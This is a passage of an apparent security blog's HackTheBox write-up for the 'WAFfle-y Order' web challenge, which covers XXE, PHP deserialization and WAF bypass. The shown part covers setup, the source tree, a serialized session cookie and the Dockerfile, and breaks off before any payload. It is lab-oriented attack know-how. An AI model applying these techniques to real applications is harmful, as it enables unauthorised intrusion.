<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" >
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="WAF bypass and vulnerability chain exploiting parser differentials" />
<meta property="og:locale" content="en" />
<meta name="description" content="HackTheBox &quot;WAFfle-y_Order&quot; wirteup is now available!" />
<meta property="og:description" content="HackTheBox &quot;WAFfle-y_Order&quot; wirteup is now available!" />
<link rel="canonical" href="http://localhost:4000/posts/waf-bypass-exploiting-parser-differentials/" />
<meta property="og:url" content="http://localhost:4000/posts/waf-bypass-exploiting-parser-differentials/" />
<meta property="og:site_name" content="0xbro" />
<meta property="og:image" content="http://localhost:4000/assets/img/WAFfle-y_Order/waffle-y_order_thumbnail.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-04-12T00:00:00+02:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://localhost:4000/assets/img/WAFfle-y_Order/waffle-y_order_thumbnail.png" />
<meta property="twitter:title" content="WAF bypass and vulnerability chain exploiting parser differentials" />
<meta name="twitter:site" content="@sec_0xbro" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-04-12T00:00:00+02:00","datePublished":"2023-04-12T00:00:00+02:00","description":"HackTheBox &quot;WAFfle-y_Order&quot; wirteup is now available!","headline":"WAF bypass and vulnerability chain exploiting parser differentials","image":"http://localhost:4000/assets/img/WAFfle-y_Order/waffle-y_order_thumbnail.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/waf-bypass-exploiting-parser-differentials/"},"url":"http://localhost:4000/posts/waf-bypass-exploiting-parser-differentials/"}</script>
<!-- End Jekyll SEO tag -->


  <title>WAF bypass and vulnerability chain exploiting parser differentials | 0xbro
  </title>

  <!--
  Custom Favicons - using favicon.ico only
-->

<link rel="icon" type="image/x-icon" href="/assets/img/favicons/favicon.png">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.png">

  <!-- Resource Hints -->
  
    
      
        <link rel="preconnect" href="https://fonts.googleapis.com" >
      
        <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
      
    
      
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      
        <link rel="dns-prefetch" href="https://fonts.gstatic.com" >
      
    
      
        <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      
        <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
      
    
  

  <!-- Bootstrap -->
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/css/bootstrap.min.css">
  

  <!-- Theme style -->
  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  <!-- Web Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css">

  <!-- 3rd-party Dependencies -->

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.36.4/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Image Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
  

  <!-- Scripts -->

  <script src="/assets/js/dist/theme.min.js"></script>

  <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.18/dayjs.min.js,npm/dayjs@1.11.18/locale/en.js,npm/dayjs@1.11.18/plugin/relativeTime.js,npm/dayjs@1.11.18/plugin/localizedFormat.js,npm/tocbot@4.36.4/dist/tocbot.min.js"></script>







<script defer src="/assets/js/dist/post.min.js"></script>



<!-- Pageviews -->

  

  



  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/0xbro-light.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <a class="site-title d-block" href="/">0xbro</a>
    <p class="site-subtitle fst-italic mb-0">A penetration tester, vulnerability researcher, content creator & wannabe ethical hacker blog.</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>

      <!-- Main tabs: Talks, Side projects, About (order 1-4) -->
      
        
          <li class="nav-item">
            <a href="/about/" class="nav-link">
              <i class="fa-fw fas fa-info-circle"></i>
              <span>ABOUT</span>
            </a>
          </li>
        
      
        
          <li class="nav-item">
            <a href="/timeline/" class="nav-link">
              <i class="fa-fw fas fa-timeline"></i>
              <span>TIMELINE</span>
            </a>
          </li>
        
      
        
          <li class="nav-item">
            <a href="/disclosure/" class="nav-link">
              <i class="fa-fw fas fa-handshake"></i>
              <span>DISCLOSURE</span>
            </a>
          </li>
        
      
        
      
        
      
        
      
        
      

      <!-- Separator -->
      <li class="nav-item nav-separator">
        <hr class="sidebar-divider">
      </li>

      <!-- Blog tabs: Archive, Categories, Tags (order 5+) -->
      
        
      
        
      
        
      
        
          <li class="nav-item">
            <a href="/categories/" class="nav-link">
              <i class="fa-fw fas fa-stream"></i>
              <span>CATEGORIES</span>
            </a>
          </li>
        
      
        
          <li class="nav-item">
            <a href="/projects/" class="nav-link">
              <i class="fa-fw fas fa-code"></i>
              <span>PROJECTS</span>
            </a>
          </li>
        
      
        
          <li class="nav-item">
            <a href="/tags/" class="nav-link">
              <i class="fa-fw fas fa-tags"></i>
              <span>TAGS</span>
            </a>
          </li>
        
      
        
          <li class="nav-item">
            <a href="/archives/" class="nav-link">
              <i class="fa-fw fas fa-archive"></i>
              <span>ARCHIVES</span>
            </a>
          </li>
        
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    
      <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle">
        <i class="fas fa-adjust"></i>
      </button>

      
        <span class="icon-border"></span>
      
    

    

      
        <a
          href="https://github.com/0xb120"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    

      
        <a
          href="https://twitter.com/sec_0xbro"
          aria-label="twitter"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fa-brands fa-x-twitter"></i>
        </a>
      
    
          
      

      
        <a
          href="https://www.linkedin.com/in/mattia-brollo-b4129614b/"
          aria-label="linkedin"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-linkedin"></i>
        </a>
      
    
          
        

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->

    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" class="flex-shrink-0" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">Home</a>
            </span>

          
        
          
        
          
            
              <span>WAF bypass and vulnerability chain exploiting parser differentials</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link" aria-label="Sidebar">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link" aria-label="Search">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search id="search" class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  




<!-- return -->










<article class="px-1" data-toc="true">
  <header>
    <h1 data-toc-skip>WAF bypass and vulnerability chain exploiting parser differentials</h1>
    
      <p class="post-desc fw-light mb-4">HackTheBox &quot;WAFfle-y_Order&quot; wirteup is now available!</p>
    

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1681250400"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Apr 12, 2023
</time>

      </span>

      <!-- lastmod date -->
      

      
        
        
        

        

        <div class="mt-3 mb-3">
          <a href="/assets/img/WAFfle-y_Order/waffle-y_order_thumbnail.png" class="popup img-link preview-img shimmer"><img src="/assets/img/WAFfle-y_Order/waffle-y_order_thumbnail.png"  alt="Preview Image" width="1200" height="630"  loading="lazy"></a></div>
      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              <a href="https://twitter.com/sec_0xbro">0xbro</a>
            
          </em>
        </span>

        <div>
          <!-- pageviews -->
          

          <!-- read time -->
          <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="3667 words"
>
  <em>20 min</em> read</span>

        </div>
      </div>
    </div>
  </header>

  
    <div id="toc-bar" class="d-flex align-items-center justify-content-between invisible">
      <span class="label text-truncate">WAF bypass and vulnerability chain exploiting parser differentials</span>
      <button type="button" class="toc-trigger btn me-1">
        <i class="fa-solid fa-list-ul fa-fw"></i>
      </button>
    </div>

    <button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm">
      <span class="label ps-2 pe-1">Contents</span>
      <i class="fa-solid fa-angle-right fa-fw"></i>
    </button>

    <dialog id="toc-popup" class="p-0">
      <div class="header d-flex flex-row align-items-center justify-content-between">
        <div class="label text-truncate py-2 ms-4">WAF bypass and vulnerability chain exploiting parser differentials</div>
        <button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75">
          <i class="fas fa-close"></i>
        </button>
      </div>
      <div id="toc-popup-content" class="px-4 py-3 pb-4"></div>
    </dialog>
  

  <div class="content">
    <h1 id="introduction">Introduction</h1>

<p><strong>WAFfle-y Order</strong> is a medium-difficulty web challenge from <strong>HackTheBox</strong> that involves attacking a custom application vulnerable to <strong>XXE Injection</strong> and <strong>PHP arbitrary deserialization</strong> <strong>bypassing two different WAF regexes</strong>.</p>

<h2 id="improved-skills"><span class="me-2">Improved skills</span><a href="#improved-skills" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<ul>
  <li><strong>Code review</strong> for PHP applications</li>
  <li>Exploit <strong>PHP deserialization</strong> vulnerabilities</li>
  <li>Exploit <strong>XML External Entity Injection</strong> vulnerabilities</li>
  <li>Bypass <strong>regex-based WAF</strong> using <strong>parser differentials</strong></li>
</ul>

<h2 id="video"><span class="me-2">Video</span><a href="#video" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<iframe width="560" height="315" src="https://www.youtube.com/embed/IESwry_l-UU" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

<hr />

<h1 id="writeup-tldr">Writeup [TL;DR]</h1>

<p><strong>WAFfle-y Order</strong> is a medium-difficulty web challenge from <strong>HackTheBox</strong> that involves attacking a custom application where we can order some Waffles or Ice Cream.</p>

<blockquote>
  <p><em>Remember whatâ€™s important in life: friends ğŸ¤, WAFfles ğŸ§‡, work ğŸ’¼. or ğŸ§‡ WAFfles. ğŸ¤ friends. ğŸ’¼ work. Doesnâ€™t matter. But work is third ğŸ¥‰. This is why we launched our new WAFfle-y cute ordering system API for our beloved customers and friends! But remember, donâ€™t get all filled up on those regexes yet, we also offer Ice Scream ğŸ¦!</em></p>
</blockquote>

<h2 id="introduction-and-setup"><span class="me-2">Introduction and setup</span><a href="#introduction-and-setup" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>For this challenge, we are given the application source code, a docker environment to reproduce locally the same server infrastructure, and a remote server to connect to get the flag.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€<span class="o">(</span>kaliã‰¿kali<span class="o">)</span>-[~/â€¦/HTB/Challenge/Web/web_waffley_order]
â””â”€<span class="nv">$ </span>tree web_waffley_order/
web_waffley_order/
â”œâ”€â”€ Dockerfile
â”œâ”€â”€ build_docker.sh
â”œâ”€â”€ challenge
â”‚Â Â  â”œâ”€â”€ Router.php
â”‚Â Â  â”œâ”€â”€ assets
â”‚Â Â  â”‚Â Â  â”œâ”€â”€ css
â”‚Â Â  â”‚Â Â  â”‚Â Â  â””â”€â”€ main.css
â”‚Â Â  â”‚Â Â  â”œâ”€â”€ favicon.ico
â”‚Â Â  â”‚Â Â  â””â”€â”€ js
â”‚Â Â  â”‚Â Â      â””â”€â”€ main.js
â”‚Â Â  â”œâ”€â”€ controllers
â”‚Â Â  â”‚Â Â  â””â”€â”€ OrderController.php
â”‚Â Â  â”œâ”€â”€ index.php
â”‚Â Â  â”œâ”€â”€ models
â”‚Â Â  â”‚Â Â  â”œâ”€â”€ UserModel.php
â”‚Â Â  â”‚Â Â  â””â”€â”€ XmlParserModel.php
â”‚Â Â  â””â”€â”€ views
â”‚Â Â      â””â”€â”€ menu.php
â”œâ”€â”€ config
â”‚Â Â  â”œâ”€â”€ fpm.conf
â”‚Â Â  â”œâ”€â”€ nginx.conf
â”‚Â Â  â””â”€â”€ supervisord.conf
â””â”€â”€ flag
</pre></td></tr></tbody></table></code></div></div>

<p>We can start building the docker environment while taking a look at the application:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€<span class="o">(</span>kaliã‰¿kali<span class="o">)</span>-[~/â€¦/HTB/Challenge/Web/web_waffley_order]
â””â”€<span class="nv">$ </span><span class="nb">cat </span>build_docker.sh
<span class="c">#!/bin/bash</span>
docker build <span class="nt">-t</span> web_waffley_order <span class="nb">.</span>
docker run <span class="nt">--name</span><span class="o">=</span>web_waffley_order <span class="nt">--rm</span> <span class="nt">-p1337</span>:80 <span class="nt">-it</span> web_waffley_order

â”Œâ”€â”€<span class="o">(</span>kaliã‰¿kali<span class="o">)</span>-[~/â€¦/HTB/Challenge/Web/web_waffley_order]
â””â”€<span class="nv">$ </span><span class="nb">chmod</span> +x build_docker.sh
</pre></td></tr></tbody></table></code></div></div>

<h2 id="information-gathering"><span class="me-2">Information Gathering</span><a href="#information-gathering" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="the-application-at-a-glance-"><span class="me-2">The application at-a-glance ğŸ”</span><a href="#the-application-at-a-glance-" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Here we canâ€™t do much, we can only order some WAFfles or some Ice Cream and nothing more.</p>

<p><a href="/assets/img/WAFfle-y_Order/WAFfle-y_Order_bc7ec381b01f4d9187fad6632cc87721.png" class="popup img-link shimmer"><img src="/assets/img/WAFfle-y_Order/WAFfle-y_Order_bc7ec381b01f4d9187fad6632cc87721.png" alt="Home page" loading="lazy"></a></p>

<p>By looking at the request sent to the server, we can observe that it sends a JSON object containing our order and it also uses a serialized <code class="language-plaintext highlighter-rouge">PHPSESSID</code> to identify the user:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>POST /api/order HTTP/1.1
Host: localhost:1337
Cookie: <span class="nv">PHPSESSID</span><span class="o">=</span>Tzo5OiJVc2VyTW9kZWwiOjE6e3M6ODoidXNlcm5hbWUiO3M6MTA6Imd1ZXN0XzYyNWQiO30%3D

<span class="o">{</span><span class="s2">"table_num"</span>:<span class="s2">"test"</span>,<span class="s2">"food"</span>:<span class="s2">"WAFfles"</span><span class="o">}</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>HTTP/1.1 200 OK
Server: nginx
Date: Mon, 18 Apr 2022 20:01:51 GMT
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
Connection: close
X-Powered-By: PHP/7.4.28
Content-Length: 102

<span class="o">{</span><span class="s2">"status"</span>:<span class="s2">"success"</span>,<span class="s2">"message"</span>:<span class="s2">"Hello guest_625d, your WAFfles order has been submitted successfully."</span><span class="o">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The content of <code class="language-plaintext highlighter-rouge">PHPSESSID</code> is the following:</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'Tzo5OiJVc2VyTW9kZWwiOjE6e3M6ODoidXNlcm5hbWUiO3M6MTA6Imd1ZXN0XzYyNWQiO30='</span> | <span class="nb">base64</span> <span class="nt">-d</span>
O:9:<span class="s2">"UserModel"</span>:1:<span class="o">{</span>s:8:<span class="s2">"username"</span><span class="p">;</span>s:10:<span class="s2">"guest_625d"</span><span class="p">;</span><span class="o">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Usually, serialized data can be very dangerous, especially when they can be arbitrarily modified like in this case. Letâ€™s keep it in mind for later.</p>

<h3 id="source-code-review"><span class="me-2">Source code review</span><a href="#source-code-review" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Since the application doesnâ€™t offer many features, letâ€™s take a look at the code to better understand the internals of the program while we wait for docker to finish.</p>

<p>The <code class="language-plaintext highlighter-rouge">build_docker.sh</code> script, the <code class="language-plaintext highlighter-rouge">Dockerfile</code>, and the <code class="language-plaintext highlighter-rouge">/config</code> folder do not contain very useful information for this challenge. They just provide a bunch of configurations to correctly set up the environment:</p>

<p><em>Dockerfile</em></p>

<div class="language-Dockerfile highlighter-rouge"><div class="code-header">
        <span data-label-text="Dockerfile"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre></td><td class="rouge-code"><pre><span class="k">FROM</span><span class="s"> alpine:edge</span>

<span class="c"># Setup usr</span>
<span class="k">RUN </span>adduser <span class="nt">-D</span> <span class="nt">-u</span> 1000 <span class="nt">-g</span> 1000 <span class="nt">-s</span> /bin/sh www

<span class="c"># Install system packages</span>
<span class="k">RUN </span>apk add <span class="nt">--no-cache</span> <span class="nt">--update</span> supervisor nginx

<span class="c"># Install PHP dependencies</span>
<span class="k">RUN </span>apk add <span class="nt">--no-cache</span> <span class="nt">--update</span> php7-fpm php7-xml php7-simplexml php7-json

<span class="c"># Configure php-fpm and nginx</span>
<span class="k">COPY</span><span class="s"> config/fpm.conf /etc/php7/php-fpm.d/www.conf</span>
<span class="k">COPY</span><span class="s"> config/supervisord.conf /etc/supervisord.conf</span>
<span class="k">COPY</span><span class="s"> config/nginx.conf /etc/nginx/nginx.conf</span>

<span class="c"># Copy challenge files</span>
<span class="k">COPY</span><span class="s"> challenge /www</span>

<span class="k">COPY</span><span class="s"> flag /flag</span>

<span class="c"># Setup permissions</span>
<span class="k">RUN </span><span class="nb">chown</span> <span class="nt">-R</span> www:www /var/lib/nginx

<span class="c"># Expose the port nginx is listening on</span>
<span class="k">EXPOSE</span><span class="s"> 80</span>

<span class="c"># Populate database and start supervisord</span>
<span class="k">CMD</span><span class="s"> /usr/bin/supervisord -c /etc/supervisord.conf</span>
</pre></td></tr></tbody></table></code></div></div>

<p><em>build_docker.sh</em></p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>
docker build <span class="nt">-t</span> web_waffley_order <span class="nb">.</span>
docker run <span class="nt">--name</span><span class="o">=</span>web_waffley_order <span class="nt">--rm</span> <span class="nt">-p1337</span>:80 <span class="nt">-it</span> web_waffley_order
</pre></td></tr></tbody></table></code></div></div>

<p>The web application code instead is located under the <code class="language-plaintext highlighter-rouge">/challenge</code> folder.</p>

<p><code class="language-plaintext highlighter-rouge">index.php</code> is the application entry point. Here we can see that some PHP controllers and models are included, then an XML file is read and processed by the <code class="language-plaintext highlighter-rouge">XmlParserModel</code> class, and then the PHPSESSID is checked and eventually set up.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="nb">spl_autoload_register</span><span class="p">(</span><span class="k">function</span> <span class="p">(</span><span class="nv">$name</span><span class="p">){</span>
	<span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/Controller$/'</span><span class="p">,</span> <span class="nv">$name</span><span class="p">))</span>
	<span class="p">{</span>
		<span class="nv">$name</span> <span class="o">=</span> <span class="s2">"controllers/${name}"</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/Model$/'</span><span class="p">,</span> <span class="nv">$name</span><span class="p">))</span>
	<span class="p">{</span>
		<span class="nv">$name</span> <span class="o">=</span> <span class="s2">"models/${name}"</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">include_once</span> <span class="s2">"${name}.php"</span><span class="p">;</span>
<span class="p">});</span>

<span class="k">new</span> <span class="nc">XmlParserModel</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">'.env'</span><span class="p">));</span>

<span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'PHPSESSID'</span><span class="p">]))</span>
<span class="p">{</span>
	<span class="nv">$user</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">UserModel</span><span class="p">;</span>
